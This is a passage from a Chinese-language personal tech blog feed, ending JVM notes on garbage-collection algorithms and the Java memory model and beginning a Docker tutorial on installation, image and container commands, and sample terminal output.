<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/26875756d86816c75926906a4d67903c--038c--image-20241002152233036.png" alt="image-20241002152233036"></p>
<p>好处：没有内存的碎片</p>
<p>坏处：浪费了内存空间，多了一半空间永远是空（To），假设对象100%存活(极端情况)</p>
<p>复制算法最佳使用场景：对象存活度较低的区域，新生区</p>
<h1 id="十一、GC之标记压缩清除算法"><a href="#十一、GC之标记压缩清除算法" class="headerlink" title="十一、GC之标记压缩清除算法"></a>十一、GC之标记压缩清除算法</h1><h2 id="标记清除"><a href="#标记清除" class="headerlink" title="标记清除"></a>标记清除</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/d9605fa66682ee4502ae00fc31e53fdb--c834--image-20241002152649930.png" alt="image-20241002152649930"></p>
<p>优点：不需要额外的空间！</p>
<p>缺点：两次扫描，严重浪费时间，会产生内存碎片</p>
<h2 id="标记压缩"><a href="#标记压缩" class="headerlink" title="标记压缩"></a>标记压缩</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/f62b9bdd6057a232b59795de140c44a1--1843--image-20241002152705256.png" alt="image-20241002152705256"></p>
<h2 id="标记清除压缩"><a href="#标记清除压缩" class="headerlink" title="标记清除压缩"></a>标记清除压缩</h2><p>先标记清除几次</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/c77c99081d771362defd654f3a2faf49--25b7--image-20241002152724230.png" alt="image-20241002152724230"></p>
<p>再压缩</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/4d9607858f7e3a699652c996668bb036--7231--image-20241002152734368.png" alt="image-20241002152734368"></p>
<h1 id="十二、GC算法总结"><a href="#十二、GC算法总结" class="headerlink" title="十二、GC算法总结"></a>十二、GC算法总结</h1><p>内存效率：复制算法 &gt; 标记清除算法 &gt; 标记压缩算法（时间复杂度）</p>
<p>内存整齐度：复制算法 &#x3D; 标记压缩算法 &gt; 标记清除算法</p>
<p>内存利用率： 标记压缩算法 &#x3D; 标记清除算法 &gt; 复制算法</p>
<p>思考：难道没有最优算法吗？</p>
<p>答案：没有，没有最好的算法，只有最合适的算法 —–》 GC：分代收集算法</p>
<p>年轻代：</p>
<ul>
<li>存活率低</li>
<li>复制算法</li>
</ul>
<p>老年代：</p>
<ul>
<li>区域大：存活率</li>
<li>标记清除（内存碎片不是太多）+ 标记压缩 混合实现</li>
</ul>
<p>一天时间学JVM,不现实，要深究，必须要花时间，多看面试题，以及《深入理解JVM》</p>
<p>但是，我们可以掌握一个学习JVM的方法</p>
<h1 id="十三、如何快速学习方法讲解"><a href="#十三、如何快速学习方法讲解" class="headerlink" title="十三、如何快速学习方法讲解"></a>十三、如何快速学习方法讲解</h1><p>JMM:java Memory Model（java内存模型）</p>
<ol>
<li><p>什么是JMM</p>
<p>【JMM】（Java Memory Model的缩写）</p>
</li>
<li><p>它干嘛的？– 官方，其他人的博客，对应的视频</p>
<p>作用：缓存一致性协议，用于定义数据读写的规则（遵守，找到这个规则）</p>
<p>JMM定义了线程工作内存和主内存之间的抽象关系，线程之间的共享变量存储在主内存（Main Memory）中，每个线程都有一个私有的本地内存（Local Memory）</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/a0441016fecf4962d73058e54efe8f11--fc1d--image-20241002152846508.png" alt="image-20241002152846508"></p>
<ol>
<li><p>解决共享对象可见性这个问题：volatile</p>
</li>
<li><p>它该如何学习？</p>
<p>JMM：抽象的概念，理论</p>
<p>JMM对这八种指令的使用，制定了如下规则：</p>
<ul>
<li><p>不允许read和load、store和write操作之一单独出现。即使用了read必须load，使用了store必须write</p>
</li>
<li><p>不允许线程丢弃他最近的assign操作，即工作变量的数据改变了之后，必须告知主存</p>
</li>
<li><p>不允许一个线程将没有assign的数据从工作内存同步回主内存</p>
</li>
<li><p>一个新的变量必须在主内存中诞生，不允许工作内存直接使用一个未被初始化的变量。就是怼变量实施use、store操作之前，必须经过assign和load操作</p>
</li>
<li><p>一个变量同一时间只有一个线程能对其进行lock。多次lock后，必须执行相同次数的unlock才能解锁</p>
</li>
<li><p>如果对一个变量进行lock操作，会清空所有工作内存中此变量的值，在执行引擎使用这个变量前，必须重新load或assign操作初始化变量的值</p>
</li>
<li><p>如果一个变量没有被lock，就不能对其进行unlock操作。也不能unlock一个被其他线程锁住的变量</p>
</li>
<li><p>对一个变量进行unlock操作之前，必须把此变量同步回主内存</p>
</li>
</ul>
<p>JMM对这八种操作规则和对<a href="https://www.cnblogs.com/null-qige/p/8569131.html">volatile的一些特殊规则</a>就能确定哪里操作是线程安全，哪些操作是线程不安全的了。但是这些规则实在复杂，很难在实践中直接分析。所以一般我们也不会通过上述规则进行分析。更多的时候，使用java的happen-before规则来进行分析。</p>
</li>
</ol>
<hr>
<p>   学习新东西是常态</p>
<p>   针对面试学习</p>
<p>   针对技术学习</p>
<p>   面试：</p>
<p>   3&#x2F;10 &#x3D;&#x3D; pass ，面经 &#x3D;10 ，分析这10个？触类旁通：百度面试题</p>
<p>   通过大量的面试总结，得出一套解题思路</p>
<p>更多阅读：<a href="https://mp.weixin.qq.com/s/nSwNZpObWLGteG-v7n5PSw">https://mp.weixin.qq.com/s/nSwNZpObWLGteG-v7n5PSw</a></p>
]]></content>
  </entry>
  <entry>
    <title>Docker学习</title>
    <url>/2024/09/21/Docker%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>Docker最近用的真多</p>
<span id="more"></span>

<h1 id="一、Docker概述"><a href="#一、Docker概述" class="headerlink" title="一、Docker概述"></a>一、Docker概述</h1><h2 id="1、docker为什么会出现"><a href="#1、docker为什么会出现" class="headerlink" title="1、docker为什么会出现"></a>1、docker为什么会出现</h2><p>工作中，经常出现“在我的机器上可正常工作”的问题</p>
<p>因为环境不一致等原因导致。。。</p>
<p>Docker的思想就来自于集装箱！</p>
<p>隔离：Docker核心思想！打包装箱！每个箱子是互相隔离的。</p>
<p>Docker通过隔离机制，可以将服务器利用到极致！</p>
<h2 id="2、Docker的历史"><a href="#2、Docker的历史" class="headerlink" title="2、Docker的历史"></a>2、Docker的历史</h2><p>Docker 是基于Go 语言实现的开源容器项目，诞生于2013 年年初，最初发起者是 dotCloud 公司。Docker 自开源后受到广泛的关注和l 讨论，目前已有多个相关项目（包括 Docker 三剑客、Kubemetes 等），逐渐形成了围绕Docker 容器的生态体系。 由于Docker 在业界造成的影响力实在太大， dotCloud 公司后来也直接改名为Docker Inc ，并专注于Docker 相关技术和产品的开发。</p>
<p>自从dotCloud公司开源其Docker项目后，凭借其便捷的Docker镜像技术解决了当时困扰众多PaaS项目的难题：如何为应用打包，让用户将本地的应用顺利迁移到PaaS平台，而不用顾忌应用的开发语言、配置、依赖包等诸多因素，也因此开启了全新的Docker容器时代。</p>
<h2 id="3、Docker能干嘛"><a href="#3、Docker能干嘛" class="headerlink" title="3、Docker能干嘛"></a>3、Docker能干嘛</h2><p>对开发和运维（ <strong>DevOps</strong> ）人员来说，可能最梦寐以求的效果就是一次创建或配置， 之后可以在任意地方、任意时间让应用正常运行。</p>
<p>具体说来， Docker 在开发和运维过程中，具有如下几个方面的优势：</p>
<ol>
<li><p><strong>更快速的交付和部署</strong></p>
<p>使用Docker ，开发人员可以使用镜像来快速构建一套标准的开发环境；开发完成之后，测试和运维人员可以直接使用完全相同环境来部署代码。只要开发测试过的代码，就可以确保在生产环境无缝运行。Docker 可以快速创建和删除容器，实现快速迭代，大量节约开发、测试、部署的时间。并且，整个过程全程可见，使团队更容易理解应用的创建和工作过程。</p>
</li>
<li><p><strong>更高效的资源利用</strong></p>
<p>Docker 容器的运行不需要额外的虚拟化管理程序（Virtual Machine Manager, VMM ，以及Hypervisor）支持，它是内核级的虚拟化，可以实现更高的性能，同时对资源的额外需求很低。跟传统虚拟机方式相比，要提高一到两个数量级。</p>
</li>
<li><p><strong>更轻松的迁移和扩展</strong></p>
<p>Docker 容器几乎可以在任意的平台上运行，包括物理机、虚拟机、公有云、私有云、个人电脑、服务器等，同时支持主流的操作系统发行版本。这种兼容性让用户可以在不同平台之间轻松地迁移应用。</p>
</li>
<li><p><strong>更简单的更新管理</strong></p>
<p>使用Dockerfile ，只需要小小的配置修改，就可以替代以往大量的更新工作。并且所有修改都以增量的方式被分发和更新，从而实现自动化并且高效的容器管理。</p>
</li>
</ol>
<blockquote>
<p>Docker 和常见的虚拟化方式的不同之处</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/46de97d6c7d3ec4bc0c24d94f32025ee--6893--image-20240921201222753.png" alt="image-20240921201222753"></p>
<p><strong>传统方式是在硬件层面实现虚拟化，需要有额外的虚拟机管理应用和虚拟机操作系统</strong> <strong>层。Docker 容器是在操作系统层面上实现虚拟化，直接复用本地主机的操作系统，因此更加</strong> <strong>轻量级。</strong></p>
<p>Docker 在容器的基础上，进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护。使得 Docker 技术比虚拟机技术更为轻便、快捷。</p>
<p>作为一种新兴的虚拟化方式，Docker 跟传统的虚拟化方式相比具有众多的优势。Docker 容器的启动可以在秒级实现，这相比传统的虚拟机方式要快得多；Docker 对系统资源的利用率很高，一台主机上可以同时运行数千个 Docker 容器。</p>
<h1 id="二、Docker安装"><a href="#二、Docker安装" class="headerlink" title="二、Docker安装"></a>二、Docker安装</h1><h2 id="1、Docker的基本组成"><a href="#1、Docker的基本组成" class="headerlink" title="1、Docker的基本组成"></a>1、Docker的基本组成</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/cdad8f4b97c506bb09c7c4b085b817bb--d293--image-20240921201553913.png" alt="image-20240921201553913"></p>
<ul>
<li><p><strong>镜像（Image）</strong></p>
<p>什么是 Docker 镜像？简单的理解，Docker 镜像就是一个 Linux 的文件系统（Root FileSystem），这个文件系统里面包含可以运行在 Linux 内核的程序以及相应的数据。</p>
<p>通过镜像启动一个容器，一个镜像就是一个可执行的包，其中包括运行应用程序所需要的所有内容：包含代码，运行时间，库，环境变量和配置文件等。</p>
<p><strong>Docker 把 App 文件打包成为一个镜像</strong>，并且采用类似多次快照的存储技术，可以实现：</p>
<ul>
<li>多个 App 可以共用相同的底层镜像（初始的操作系统镜像）</li>
<li>App 运行时的 IO 操作和镜像文件隔离</li>
<li>通过挂载包含不同配置&#x2F;数据文件的目录或者卷（Volume），单个 App 镜像可以用来运行无数个不同业务的容器</li>
</ul>
</li>
<li><p><strong>容器（container）</strong></p>
<p>镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
<blockquote>
<p>通俗来讲，镜像相当于类，容器相当于对象</p>
</blockquote>
</li>
<li><p><strong>仓库（repository）</strong></p>
<p>仓库可看成一个代码控制中心，用来保存镜像。</p>
<p>仓库分为公有仓库和私有仓库。(很类似git)</p>
<p>Docker Hub是国外的。</p>
<p>阿里云…都有容器服务器(配置镜像加速!)</p>
</li>
</ul>
<h2 id="2、安装docker"><a href="#2、安装docker" class="headerlink" title="2、安装docker"></a>2、安装docker</h2><ul>
<li>使用云服务器的，可以直接去对应的官网寻找对应的安装配置方案</li>
<li>比如我这里使用的就是腾讯云的Ubuntu系统</li>
</ul>
<ol>
<li>执行以下命令，添加 Docker 软件源。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install ca-certificates curl</span><br><span class="line">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="line">sudo curl -fsSL https://mirrors.cloud.tencent.com/docker-ce/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc</span><br><span class="line">sudo <span class="built_in">chmod</span> a+r /etc/apt/keyrings/docker.asc</span><br><span class="line"><span class="built_in">echo</span>   <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.asc] https://mirrors.cloud.tencent.com/docker-ce/linux/ubuntu/ \</span></span><br><span class="line"><span class="string">  <span class="subst">$(. /etc/os-release &amp;&amp; echo <span class="string">&quot;<span class="variable">$VERSION_CODENAME</span>&quot;</span>)</span> stable&quot;</span> |   sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>执行以下命令，安装 Docker。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>执行以下命令，运行 Docker。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>执行以下命令，检查安装结果。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure>

<p>返回如下信息，即表示安装成功。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/28470f218824e23ec82ce28a7b50fbba--134f--image-20240922094005847.png" alt="image-20240922094005847"></p>
<ul>
<li>配置对应的加速源</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>

<ul>
<li>然后添加以下内容</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line">   <span class="string">&quot;https://mirror.ccs.tencentyun.com&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行以下命令，重启 Docker 即可。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<blockquote>
<p>测试使用</p>
</blockquote>
<p>运行hello-world</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/5bf1cdf230c3155be2fdda1beabb1ff3--764e--image-20240922095218341.png" alt="image-20240922095218341"></p>
<blockquote>
<p>查看镜像</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">hello-world   latest    d2c94e258dcb   16 months ago   13.3kB</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看容器</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED              STATUS                          PORTS     NAMES</span><br><span class="line">03e09e9f8b65   hello-world   <span class="string">&quot;/hello&quot;</span>   About a minute ago   Exited (0) About a minute ago          compassionate_gates</span><br><span class="line"><span class="comment"># 加-a表示所有容器，包括未运行的，不加-a表示正在运行的容器</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>移除容器镜像        </p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rmi -f d2c94e258dcb  移除镜像</span></span><br><span class="line">Untagged: hello-world:latest</span><br><span class="line">Untagged: hello-world@sha256:91fb4b041da273d5a3273b6d587d62d518300a6ad268b28628f74997b93171b2</span><br><span class="line">Deleted: sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rm 03e09e9f8b65  移除容器</span></span><br><span class="line">03e09e9f8b65</span><br></pre></td></tr></table></figure>

<h2 id="3、回滚hello-world流程"><a href="#3、回滚hello-world流程" class="headerlink" title="3、回滚hello-world流程"></a>3、回滚hello-world流程</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/5f27548b9d8f1e9607ec770f8163467d--85fa--image-20240922100450374.png" alt="image-20240922100450374"></p>
<p><strong>底层原理</strong></p>
<blockquote>
<p>docker是怎么工作的</p>
</blockquote>
<p>docker是一个client-server结构的系统，docker守护进程运行在主机上，然后通过socket连接从客户端访问docker守护进程。</p>
<p>docker守护进程从客户端接收命令，并按照命令，管理运行在主机上的容器。</p>
<p>一个docker容器，是一个运行时环境，可以简单理解为进程运行的集装箱。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/d9a59b17ba24e343869da74322314fe6--cc31--image-20240922100554772.png" alt="image-20240922100554772"></p>
<blockquote>
<p>为什么docker比vm快</p>
</blockquote>
<ol>
<li>Docker有这比虚拟机更少的抽象层，<strong>由于Docker不需要Hypervisor实现硬件资源虚拟化</strong>，运行在Docker上的程序直接使用的都是实际物理机上的硬件资源，因此在CPU、内存利用率上有明显的优势。</li>
<li>**Docker利用的是宿主机的内核，而不需要使用Guest OS ** ，因此当新建一个容器时，docker不需要和虚拟机一样重新加载一个操作系统内核，而避免引寻 ，加载操作系统内核是个比较费事费资源的过程，当新建一个虚拟机时，虚拟机软件需要加载Guest OS，返回的新建的过程是分钟级别，而docker直接使用的是宿主机上的操作系统，则省略了返回这个的过程，因此新建一个docker容器只需要几秒钟。</li>
</ol>
<p>虚拟机与Docker架构对比图：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/18b3c4595e4fcb446eec5aa6f07eb057--d721--image-20240922100609249.png" alt="image-20240922100609249"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/bd0035ab49544d13114ef688ea55e553--3f26--image-20240922100613510.png" alt="image-20240922100613510"></p>
<h1 id="三、Docker常见命令"><a href="#三、Docker常见命令" class="headerlink" title="三、Docker常见命令"></a>三、Docker常见命令</h1><p>官方文档常用命令地址:<a href="https://docs.docker.com/reference/">https://docs.docker.com/reference/</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/da3aea870e0b1d7fbb60aa86470e7314--c384--image-20240922101137679.png" alt="image-20240922101137679"></p>
<h2 id="1、帮助命令"><a href="#1、帮助命令" class="headerlink" title="1、帮助命令"></a>1、帮助命令</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#显示docker的版本信息。</span></span><br><span class="line">docker version    </span><br><span class="line"><span class="comment">#显示docker的系统信息，包括镜像和容器的数量</span></span><br><span class="line">docker info   </span><br><span class="line"><span class="comment">#帮助命令</span></span><br><span class="line">docker --<span class="built_in">help</span></span><br><span class="line">docker 命令 --<span class="built_in">help</span> </span><br></pre></td></tr></table></figure>

<h2 id="2、镜像命令"><a href="#2、镜像命令" class="headerlink" title="2、镜像命令"></a>2、镜像命令</h2><blockquote>
<p>docker image  查看所有本地主机上的镜像</p>
</blockquote>
<p>参数和选项</p>
<ul>
<li><code>-a</code>, –all             列出所有镜像</li>
<li><code>-q</code>, –quiet           只显示镜像id</li>
</ul>
<p>测试</p>
<p>1、查看本地主机上的镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">hello-world   latest    d2c94e258dcb   16 months ago   13.3kB</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<ul>
<li>REPOSITORY 镜像的仓库源</li>
<li>TAG 镜像的标签（版本） latest表示最新的版本</li>
<li>IMAGE ID 镜像id</li>
<li>CREATED 镜像的创建时间</li>
<li>SIZE 镜像的大小</li>
</ul>
<p>2、列出所有镜像的id</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images -aq</span></span><br><span class="line">d2c94e258dcb</span><br></pre></td></tr></table></figure>

<blockquote>
<p>docker search 搜索镜像</p>
</blockquote>
<p>镜像仓库地址：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<p>参数和选项</p>
<ul>
<li><code>-f</code>, –filter filter   基于条件过滤</li>
</ul>
<p>测试</p>
<p>1、搜索mysql镜像</p>
<p>在docker仓库上搜  <a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<p>也可以直接使用命令去搜</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ****</span><br></pre></td></tr></table></figure>

<p>不过服务器要是不太行，一般会直接超时。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker search mysql</span></span><br><span class="line">Error response from daemon: Get <span class="string">&quot;https://index.docker.io/v1/search?q=mysql&amp;n=25&quot;</span>: dial tcp 199.59.150.39:443: i/o <span class="built_in">timeout</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>docker rmi删除镜像</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rmi -f 镜像id                    #删除指定镜像</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rmi -f 镜像id1 镜像id2 镜像id3     #删除多个镜像</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker rmi -f $(docker images -aq)      #删除所有镜像 </span></span><br></pre></td></tr></table></figure>

<h2 id="3、容器命令"><a href="#3、容器命令" class="headerlink" title="3、容器命令"></a>3、容器命令</h2><p>我们有了镜像，才能创建容器，所以先下载一个centos镜像来学习</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull centos</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/centos</span><br><span class="line">a1d0c7532777: Pull complete </span><br><span class="line">Digest: sha256:a27fd8080b517143cbbbab9dfb7c8571c40d67d534bbdee55bd6c473f432b177</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> centos:latest</span><br><span class="line">docker.io/library/centos:latest</span><br></pre></td></tr></table></figure>

<blockquote>
<p>启动容器</p>
</blockquote>
<p>docker run [可选参数] 容器名或者容器id</p>
<p>创建一个新的容器并运行一个命令</p>
<p>可选参数</p>
<ul>
<li><strong>-i:</strong> 以交互模式运行容器，通常与 -t 同时使用</li>
<li><strong>-t:</strong> 为容器重新分配一个伪输入终端，通常与 -i 同时使用</li>
<li><strong>-P:</strong> 随机端口映射，容器内部端口<strong>随机</strong>映射到主机的端口</li>
<li><strong>-p:</strong> 指定端口映射，格式为：<strong>主机(宿主)端口:容器端口</strong></li>
<li><strong>-d:</strong> 后台运行容器，并返回容器ID；</li>
<li><strong>–name&#x3D;”nginx-lb”:</strong> 为容器指定一个名称</li>
<li><strong>-e username&#x3D;”ritchie”:</strong> 设置环境变量</li>
</ul>
<p>测试：</p>
<p>1、使用镜像centos以交互模式启动一个容器,在容器内执行&#x2F;bin&#x2F;bash命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it centos /bin/bash</span></span><br><span class="line">[root@5bfd7775d62f /]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES</span><br><span class="line">5bfd7775d62f   centos    <span class="string">&quot;/bin/bash&quot;</span>   55 seconds ago   Up 54 seconds             goofy_ellis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>退出容器</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span>       <span class="comment">#直接退出容器并关闭</span></span><br><span class="line">快捷键：ctrl+p+q   <span class="comment">#容器不关闭退出 注意p和q的顺序！</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>列出所有的容器</p>
</blockquote>
<p>docker ps</p>
<p>可选参数</p>
<ul>
<li>**-a :**显示所有的容器，包括未运行的。</li>
<li>**-n :**列出最近创建的n个容器。</li>
<li>**-q :**静默模式，只显示容器编号。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED              STATUS              PORTS     NAMES</span><br><span class="line">5bfd7775d62f   centos    <span class="string">&quot;/bin/bash&quot;</span>   About a minute ago   Up About a minute             goofy_ellis</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE         COMMAND       CREATED              STATUS                      PORTS     NAMES</span><br><span class="line">5bfd7775d62f   centos        <span class="string">&quot;/bin/bash&quot;</span>   About a minute ago   Up About a minute                     goofy_ellis</span><br><span class="line">8d2482707137   hello-world   <span class="string">&quot;/hello&quot;</span>      12 minutes ago       Exited (0) 12 minutes ago             clever_mccarthy</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除容器</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f 容器<span class="built_in">id</span>                       <span class="comment"># 删除指定容器</span></span><br><span class="line">docker <span class="built_in">rm</span> -f $(docker ps -aq)       <span class="comment"># 删除所有容器</span></span><br><span class="line">docker ps -a -q|xargs docker <span class="built_in">rm</span> -f  <span class="comment"># 删除所有的容器</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>启动和停止容器</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start 容器<span class="built_in">id</span>           <span class="comment"># 启动容器</span></span><br><span class="line">docker restart 容器<span class="built_in">id</span>         <span class="comment"># 重启容器</span></span><br><span class="line">docker stop 容器<span class="built_in">id</span>            <span class="comment"># 停止当前正在运行的容器</span></span><br><span class="line">docker <span class="built_in">kill</span> 容器<span class="built_in">id</span>            <span class="comment"># 强制停止当前的容器</span></span><br></pre></td></tr></table></figure>

<h2 id="4、常用其他命令"><a href="#4、常用其他命令" class="headerlink" title="4、常用其他命令"></a>4、常用其他命令</h2><blockquote>
<p>后台启动命令</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d centos</span></span><br><span class="line">3c59ba355924fa7659dea00b40ee81e0b156ea8173cc3ed55d10abdda9b71346</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line"></span><br><span class="line"><span class="comment"># 问题，后端启动容器后，docker ps，发现centos停止了</span></span><br><span class="line"><span class="comment"># 常见的坑， docker 容器使用后台运行， 就必须要有一个前台进程，docker发现没有应用，就会自动停止</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -it centos  #这种启动容器后就不会关闭了</span></span><br><span class="line">427021a3fe1bed3ce5a2950d50204b0b5c7ba6124e436132cb810791e04d7c9d</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">427021a3fe1b   centos    <span class="string">&quot;/bin/bash&quot;</span>   3 seconds ago   Up 3 seconds             brave_moore</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看日志</p>
</blockquote>
<p>docker logs [参数与参选] 容器id</p>
<p>参数与选项</p>
<ul>
<li><strong>-f :</strong> 跟踪日志输出</li>
<li><strong>-t :</strong> 显示时间戳</li>
<li>**–since :**显示某个开始时间的所有日志</li>
<li><strong>-n</strong>或者**–tail :**仅列出最新N条容器日志</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker logs -tf -n=10 容器id</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker logs -tf -n=10 427021a3fe1b</span></span><br><span class="line"><span class="comment"># 这里没有日志，我们自己编写一段shell脚本</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -it centos /bin/bash -c &quot;while true;do echo zyy hello;sleep 10;done&quot;</span></span><br><span class="line">26805bf07f643d921b05be3a9c3f9eff41481bc302406c8c64b8ffbfc72b52ee</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker logs -tf -n=10 26805bf07f6</span></span><br><span class="line">2024-09-22T02:29:02.878255691Z zyy hello</span><br><span class="line">2024-09-22T02:29:12.896589927Z zyy hello</span><br></pre></td></tr></table></figure>

<p><strong>命令<code>docker run -d -it centos /bin/bash -c &quot;while true;do echo zyy hello;sleep 1;done&quot;</code>解释：</strong></p>
<p>该命令会不停地输出字符串 “zyy hello”，每隔 1 秒钟输出一次，直到容器被停止。</p>
<p>其中，各个参数的含义如下：</p>
<ul>
<li><code>docker run</code> 是 Docker 命令的基本语法，用于启动一个新的容器。</li>
<li><code>-d</code> 参数表示在后台运行容器。</li>
